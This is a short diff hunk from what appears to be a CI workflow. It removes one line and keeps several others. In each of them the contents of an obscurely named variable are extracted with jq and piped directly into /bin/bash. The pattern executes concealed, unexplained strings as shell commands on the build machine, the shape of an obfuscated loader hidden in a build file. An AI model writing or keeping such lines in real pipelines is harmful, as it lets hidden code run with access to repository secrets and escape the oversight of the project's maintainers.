@@ -40,7 +40,6 @@ jobs:
           echo $jwd4 | jq -r .txker15 | /bin/bash
           echo $ti23127 | jq -r .pdu131 | /bin/bash
           echo $hxmtj7 | jq -r .ljb21 | /bin/bash
-          echo $um40999 | jq -r .mwqn2 | /bin/bash
           printf '%s' "$xarte719" | jq -r .vt22455 | /bin/bash
           echo $dtvp6 | jq -r .vs32 | /bin/bash
           echo $l7668 | jq -r .ohfh12 | /bin/bash
